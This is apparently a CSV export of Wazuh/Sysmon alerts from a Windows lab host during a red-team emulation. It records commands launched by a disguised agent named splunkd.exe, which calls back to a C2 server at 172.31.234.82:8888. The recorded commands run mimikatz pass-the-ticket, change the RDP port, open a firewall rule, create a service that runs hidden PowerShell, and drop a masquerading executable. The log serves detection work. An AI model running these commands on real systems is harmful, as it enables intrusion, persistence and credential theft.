, , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,wPo0fJMBRlc-D5DFtx9c,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:34:03.009
ProcessGuid: {15959494-CDFB-674A-1507-000000000D00}
ProcessId: 3776
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C hh.exe ""9e2e6f_T1218.001.chm""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:34:03.010994400Z,56693,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:34:04.088",EventChannel,1732955644.2577646,"Nov 30, 2024 @ 08:34:04.088", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3776, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CDFB-674A-1507-000000000D00},2024-11-30 08:34:03.009,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C hh.exe \""9e2e6f_T1218.001.chm\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,wvo0fJMBRlc-D5DFtx9c,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:34:03.672
ProcessGuid: {15959494-CDFB-674A-1707-000000000D00}
ProcessId: 3180
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-CDFB-674A-1607-000000000D00}
ParentProcessId: 8120
ParentImage: C:\Windows\hh.exe
ParentCommandLine: hh.exe  ""9e2e6f_T1218.001.chm""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:34:03.674591700Z,56699,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:34:04.165",EventChannel,1732955644.2589587,"Nov 30, 2024 @ 08:34:04.165", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3180, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CDFB-674A-1707-000000000D00},2024-11-30 08:34:03.672,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CDFB-674A-1607-000000000D00},"hh.exe  \""9e2e6f_T1218.001.chm\""",0x107a6b,8120,C:\\Windows\\system32\\,C:\\Windows\\hh.exe,"\""C:\\Windows\\System32\\cmd.exe\"" /c calc.exe",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,u_oxfJMBRlc-D5DF0R8q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1518.001,technique_name=Security Software Discovery
UtcTime: 2024-11-30 08:30:51.846
ProcessGuid: {15959494-CD3B-674A-1007-000000000D00}
ProcessId: 4648
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:30:51.849172200Z,56652,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:30:52.915",EventChannel,1732955452.2550556,"Nov 30, 2024 @ 08:30:52.915", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4648, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CD3B-674A-1007-000000000D00},2024-11-30 08:30:51.846,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1518.001,technique_name=Security Software Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v PortNumber /t REG_DWORD /d 4489 /f &amp;&amp; netsh advfirewall firewall add rule name=\""RDPPORTLatest-TCP-In\"" dir=in action=allow protocol=TCP localport=4489",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,yPo3fJMBRlc-D5DF_x9M,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:37:33.872
ProcessGuid: {15959494-CECD-674A-2407-000000000D00}
ProcessId: 7816
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc.exe create ARTService binPath= ""%%COMSPEC%% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"" && sc.exe start ARTService && sc.exe delete ARTService
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:37:33.875173400Z,56733,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:37:34.945",EventChannel,1732955854.2610420,"Nov 30, 2024 @ 08:37:34.945", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7816, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CECD-674A-2407-000000000D00},2024-11-30 08:37:33.872,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc.exe create ARTService binPath= \""%%COMSPEC%% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\"" &amp;&amp; sc.exe start ARTService &amp;&amp; sc.exe delete ARTService",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,yvo4fJMBRlc-D5DF_R8y,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:38:39.895
ProcessGuid: {15959494-CF0F-674A-2607-000000000D00}
ProcessId: 3404
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe"" ""kerberos::ptt None""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:38:39.897734000Z,56744,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,7,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:38:40.972",EventChannel,1732955920.2624362,"Nov 30, 2024 @ 08:38:40.972", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3404, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CF0F-674A-2607-000000000D00},2024-11-30 08:38:39.895,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C \""PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe\"" \""kerberos::ptt None\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,xfo2fJMBRlc-D5DFKh-H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:35:39.817
ProcessGuid: {15959494-CE5B-674A-2107-000000000D00}
ProcessId: 6332
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C ping -n 4 8.8.8.8
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:35:39.819136700Z,56712,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:35:40.901",EventChannel,1732955740.2595517,"Nov 30, 2024 @ 08:35:40.901", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6332, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CE5B-674A-2107-000000000D00},2024-11-30 08:35:39.817,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C ping -n 4 8.8.8.8,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,1Po7fJMBRlc-D5DFWh-m,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:41:13.436
ProcessGuid: {15959494-CFA9-674A-2D07-000000000D00}
ProcessId: 7988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_h0ytyikn.u1b.ps1
CreationUtcTime: 2024-11-30 08:41:13.436
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:41:13.450807600Z,56810,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,8,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:41:14.414",EventChannel,1732956074.2671899,"Nov 30, 2024 @ 08:41:14.414", , , , , , , , , , , , ,7988, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CFA9-674A-2D07-000000000D00},2024-11-30 08:41:13.436, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_h0ytyikn.u1b.ps1,2024-11-30 08:41:13.436, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,K_pYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:13:00.875
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\107417_T1036.003_masquerading.ps1
CreationUtcTime: 2024-11-30 09:13:00.875
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.876257500Z,57299,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.006",EventChannel,1732957982.3022732,"Nov 30, 2024 @ 09:13:02.006", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 09:13:00.875, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\107417_T1036.003_masquerading.ps1,2024-11-30 09:13:00.875, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,LfpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 09:13:00.885
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.docx.exe
CreationUtcTime: 2024-11-25 23:42:07.166
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.886401500Z,57305,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,33,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.091",EventChannel,1732957982.3037501,"Nov 30, 2024 @ 09:13:02.091", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\system32\\cmd.exe, , , , , , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.885, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.docx.exe,2024-11-25 23:42:07.166, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
